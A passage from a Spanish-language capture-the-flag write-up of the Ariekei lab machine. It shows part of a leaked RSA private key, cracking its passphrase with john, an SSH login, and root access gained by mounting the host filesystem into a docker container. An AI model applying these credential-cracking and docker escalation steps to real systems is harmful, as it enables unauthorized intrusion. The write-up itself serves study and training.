9T6xwBLJQSqMlPewvUUtvMQAdNu5eksupuqBMiJRUQvG9hD0jjXz8f5cCCdtu8NN
8Gu4jcZFmVvsbRCP8rQBKeqc/rqe0bhCtvuMhnl7rtyuIw2zAAqqluFs8zL6YrOw
lBLLZzo0vIfGXV42NBPgSJtc9XM3YSTjbdAk+yBNIK9GEVTbkO9GcMgVaBg5xt+6
uGE5dZmtyuGyD6lj1lKk8D7PbCHTBc9MMryKYnnWt7CuxFDV/Jp4fB+/DuPYL9YQ
8RrdIpShQKh189lo3dc6J00LmCUU5qEPLaM+AGFhpk99010rrZB/EHxmcI0ROh5T
1oSM+qvLUNfJKlvqdRQr50S1OjV+9WrmR0uEBNiNxt2PNZzY/Iv+p8uyU1+hOWcz
-----END RSA PRIVATE KEY-----
```

La crackeo con ```john```

```null
ssh2john id_rsa > hash
```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purple1          (id_rsa)     
1g 0:00:00:00 DONE (2023-03-16 17:27) 50.00g/s 33600p/s 33600c/s 33600C/s evelyn..kelly
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Suponiendo que la clave pública corresponde a la ```id_rsa```, me conecto como ese usuario

```null
root@beehive:/home/spanishdancer/.ssh# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC325QNrOHp+Ob93i/XR2XkXZ1k/ypSbKhdcKB2CQLNW1jXp+CKnb5wmin/hEJ8u3Crm5YsFjg/K/x6hBDa0TwpwQxIZ7y1JbWFXL3XRdvpi6YrIMdUwGs3lCAUwJhazVnOUAY92EnoLdQlbPgXT4gVxMfW37YDBC3Gg2YJRKUkrDaYsI9oxvGMU1vmigb/0Ck/+kG/n0yOa0NBb2orEwQYoqX1cW4PnuTmR7bD53PsWmNcYhLxSvd783tz9Q/Np7q9/ziPo2QCN1R0fY7UykmASA1hedfI6C2mUKaETN4vKnfVeppb5m7wXhkSlYULE5PcmXuGoYCD6WtwAzPiwb1r spanishdancer@ariekei.htb
```

Gano acceso a la máquina víctima

```null
ssh spanishdancer@ariekei.htb -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Mon Nov 13 10:23:41 2017 from 10.10.14.2
spanishdancer@ariekei:~$ hostname -I
10.10.10.65 172.23.0.1 172.17.0.1 172.24.0.1 dead:beef::250:56ff:feb9:4316 
```

Pertenezco al grupo ```docker```

```null
spanishdancer@ariekei:/opt/docker$ id
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
```

Listo las imágenes existentes

```null
spanishdancer@ariekei:/opt/docker$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
waf-template        latest              399c8876e9ae        5 years ago         628MB
bastion-template    latest              0df894ef4624        5 years ago         251MB
web-template        latest              b2a8f8d3ef38        5 years ago         185MB
bash                latest              a66dc6cea720        5 years ago         12.8MB
convert-template    latest              e74161aded79        6 years ago         418MB
```

Creo un contenedor que monte desde la raíz la máquina host, y puedo ver la segunda flag

```null
spanishdancer@ariekei:/opt/docker$ docker run -it -v /:/host/ waf-template chroot /host/ bash
root@67797e66308a:/# cat /root/root.txt 
2792e03d0edb1c2643ec26ad82042715
```